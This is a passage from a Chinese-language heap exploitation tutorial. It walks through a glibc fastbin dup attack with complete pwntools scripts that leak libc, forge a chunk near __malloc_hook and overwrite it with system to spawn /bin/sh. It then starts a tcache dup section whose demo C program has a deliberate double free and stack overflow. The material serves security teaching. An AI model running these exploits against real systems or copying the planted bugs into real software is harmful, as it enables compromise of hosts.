&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再來就是要寫malloc hook了，這邊先做一件事，我們先到malloc hook去看看<br>我們需要bypass一個安全機制，較chunk size要一樣<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkGTFRuPC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkGTFRuPC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>觀察一下會發現，他有很多0x7c之類的東西<br>如果能把它當header size(推到header最尾端)就可以bypass</p>
<p>推一下就可以把他推到後面了(malloc hook - 0x33)<br><div class="img-item" data-src="https://hackmd.io/_uploads/H12yoA_PR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H12yoA_PR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>所以我們應該跳到(malloc hook - 0x23)</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/B11ViCdPA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B11ViCdPA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>跳到<code>libc base + malloc hook offset - 0x23</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/rJ1hs0_PC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJ1hs0_PC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>bypass</p>
<p>接下來要做fastbin dup</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk 0 -&gt; 0x440</span><br><span class="line">chunk 1 -&gt; 0x70</span><br><span class="line">chunk 2 -&gt; 0x70</span><br><span class="line">chunk 3 -&gt; 0x70</span><br></pre></td></tr></table></figure>

<p>free 1、2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 2 -&gt; chunk 1</span><br></pre></td></tr></table></figure>

<p>再free 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 1 -&gt; chunk 2 -&gt; chunk 1 -&gt; chunk 2 -&gt; ...</span><br></pre></td></tr></table></figure>

<p>這邊再free 3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 3 -&gt; chunk 1 -&gt; chunk 2 -&gt; chunk 1 -&gt; chunk 2 -&gt; ...</span><br></pre></td></tr></table></figure>

<p>這邊注意一點，我想把<code>/bin/sh</code>寫進去到heap裡面，所以我要先leak heap的位置，這邊可以挑1 或 2，都沒差，反正到時候都用不到，我這邊挑chunk 1，因為我把chunk 3 free掉後fd指向chunk 1，所以我malloc回來get就可以拿到了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">	<span class="comment">#print(&quot;malloc size: &quot;, size)</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	<span class="comment">#print(r.recvline())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">idx</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;]: &#x27;</span>)</span><br><span class="line">	chunk_str=r.recvline().strip()</span><br><span class="line">	<span class="keyword">return</span> chunk_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">index, payload</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./fastbindup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x480</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#delete unsorted bin -&gt; fd,bk -&gt; libc address</span></span><br><span class="line">create(<span class="number">0x480</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(get(4)))</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(get(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ leak libc : &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ libc base : &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">mallochook_offset = <span class="number">0x3c4b10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + mallochook_offset - <span class="number">0x23</span></span><br><span class="line">libc_system = <span class="number">0x0000000000453a0</span> +  libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ MALLOC_HOOK : &#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak chunk 1</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">heap_chunk1 = u64(get(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ CHUNK 1 HEAP(/bin/sh chunk) : &#x27;</span>,<span class="built_in">hex</span>(heap_chunk1))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>現在fastbin chain </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 1 -&gt; chunk 2 -&gt; chunk 1 -&gt; chunk 2 -&gt; ...</span><br></pre></td></tr></table></figure>
<p>先malloc 1(ptr index 6)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 2 -&gt; chunk 1 -&gt; chunk 2 -&gt; ...</span><br><span class="line">             ^</span><br><span class="line">    chunk 1 _|</span><br><span class="line">    </span><br><span class="line">chunk 1 (free &amp; allocated)</span><br><span class="line">chunk 2 (free)</span><br></pre></td></tr></table></figure>

<p>把chunk 1 寫入 malloc_hook 位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin -&gt; chunk 2 -&gt; chunk 1 -&gt; malloc_hook</span><br><span class="line">    </span><br><span class="line">chunk 1 (free &amp; allocated)</span><br><span class="line">chunk 2 (free)</span><br></pre></td></tr></table></figure>

<p>現在<br>malloc三次，拿到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk 2(ptr index 7)</span><br><span class="line">chunk 1(ptr index 8)</span><br><span class="line">malloc_hook(ptr index 9)</span><br></pre></td></tr></table></figure>

<p>把chunk 1寫入<code>/bin/sh</code>,<code>/bin/sh</code>位置就會在<code>chunk 1 address + 0x10</code></p>
<p>那malloc hook現在到底在哪裡?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header 0x10</span><br><span class="line">0x10</span><br><span class="line">0x3 malloc hook</span><br></pre></td></tr></table></figure>
<p>所以你要先padding，<code>0x13</code>個a在寫掉malloc hook成system<br>最後傳入<code>/bin/sh</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(&quot;/bin/sh&quot;) -&gt; (*__malloc_hook)(&quot;/bin/sh&quot;) -&gt; system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="script-1"><a href="#script-1" class="headerlink" title="script"></a>script</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">	<span class="comment">#print(&quot;malloc size: &quot;, size)</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	<span class="comment">#print(r.recvline())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">idx</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;]: &#x27;</span>)</span><br><span class="line">	chunk_str=r.recvline().strip()</span><br><span class="line">	<span class="keyword">return</span> chunk_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">index, payload</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./fastbindup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x480</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#delete unsorted bin -&gt; fd,bk -&gt; libc address</span></span><br><span class="line">create(<span class="number">0x480</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(get(4)))</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(get(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ leak libc : &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ libc base : &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">mallochook_offset = <span class="number">0x3c4b10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + mallochook_offset - <span class="number">0x23</span></span><br><span class="line">libc_system = <span class="number">0x453a0</span> +  libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ MALLOC_HOOK : &#x27;</span>,<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak chunk 1</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">heap_chunk1 = u64(get(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ CHUNK 1 HEAP(/bin/sh chunk) : &#x27;</span>,<span class="built_in">hex</span>(heap_chunk1))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">r.sendline(p64(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NAUPINFO @ Write Chunk 1 : &#x27;</span>,<span class="built_in">hex</span>(u64(get(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment"># chunk 2(ptr index 7)</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment"># chunk 1(ptr index 8)</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment"># malloc_hook(ptr index 9)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>(<span class="number">8</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_malloc_hook_payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(libc_system)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;9&#x27;</span>)</span><br><span class="line">r.sendline(write_malloc_hook_payload)</span><br><span class="line"></span><br><span class="line">create(heap_chunk1+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Tcache-bin-dup-Glibc-2-26-2-28"><a href="#Tcache-bin-dup-Glibc-2-26-2-28" class="headerlink" title="Tcache bin dup(Glibc 2.26~2.28)"></a>Tcache bin dup(Glibc 2.26~2.28)</h2><p>基本上跟Fastbin dup很像，但換成了Tcache</p>
<p>Glibc 2.27沒有檢查鍊表上第一個是不是現在要free掉的chunk，所以可以直接連續free兩次chunk不會有問題</p>
<p>另外注意，chunk fd指的是data</p>
<p>如果是glibc 2.28後加入了key會被寫成Tcache相關東西</p>
<h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chunk 1(malloc)</span><br></pre></td></tr></table></figure>

<p>free掉chunk 1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tcache -&gt; Chunk 1</span><br></pre></td></tr></table></figure>
<p>再free一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tcache -&gt; Chunk 1 -&gt; Chunk 1 -&gt; Chunk 1 -&gt; ...</span><br></pre></td></tr></table></figure>

<p>malloc拿到chunk 1並改寫fd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tcache -&gt; Chunk 1 -&gt; Pwn_chunk</span><br></pre></td></tr></table></figure>
<p>malloc兩次就可以拿到你要寫的東西了</p>
<h4 id="demo-4"><a href="#demo-4" class="headerlink" title="demo"></a>demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Testing in libc-2.27</span></span><br><span class="line"><span class="comment">// gcc tcache_dup.c -o tcache_dup</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *g_ptrs;</span><br><span class="line"><span class="type">int</span> g_size;</span><br><span class="line"><span class="type">int</span> g_used;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_num</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== Note System v0.087 ===&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1) Create Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2) Get Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3) Set Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4) Delete Note&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5) Bye&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"></span><br><span class="line">    g_ptrs = <span class="built_in">malloc</span>(size);</span><br><span class="line">    g_size = size;</span><br><span class="line">    g_used = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_used) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;g_ptrs: %s\n&quot;</span>, g_ptrs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_used) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;str:\n&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, g_ptrs, g_size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_ptrs) &#123;</span><br><span class="line">        <span class="built_in">free</span>(g_ptrs);</span><br><span class="line">        g_used = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, name, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="keyword">switch</span>(read_num()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            create();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            get();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">set</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            delete();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span 